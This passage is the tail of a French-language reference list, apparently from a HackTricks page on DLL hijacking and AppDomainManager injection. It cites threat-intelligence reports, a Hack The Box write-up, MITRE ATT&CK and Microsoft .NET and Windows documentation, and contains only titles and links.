- [12] [Check Point Research – Au cœur d’Ink Dragon : révélation du réseau relais et du fonctionnement interne d’une opération offensive furtive](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – La backdoor Chrysalis : analyse approfondie de la boîte à outils de Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – Chaîne HTB Bruno ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Suivi des campagnes d’espionnage de 2026 de l’APT iranien Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Élément `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Élément `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Élément `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Élément `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Élément `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Élément `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious : opérations de Nimbus Manticore pendant le conflit iranien](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Actions de tâches](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 cible des gouvernements et des infrastructures critiques d’Asie du Sud-Est](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Reconstitution et détection du détournement de l’ordre de recherche des DLL sous Windows avec Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Création de bibliothèques natives avec Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Exports natifs avec Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Ordre de recherche des bibliothèques de liens dynamiques](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – Format PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Découverte d’une variante de SectopRAT intégrée à un logiciel légitime](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – Voler le LIGHTSHOW (première partie)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Opération FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
- [35] [Kaspersky Securelist – NetamLoader, framework de chargement .NET basé sur XAML](https://securelist.com/netamloader/121676)
{{#include ../../../banners/hacktricks-training.md}}
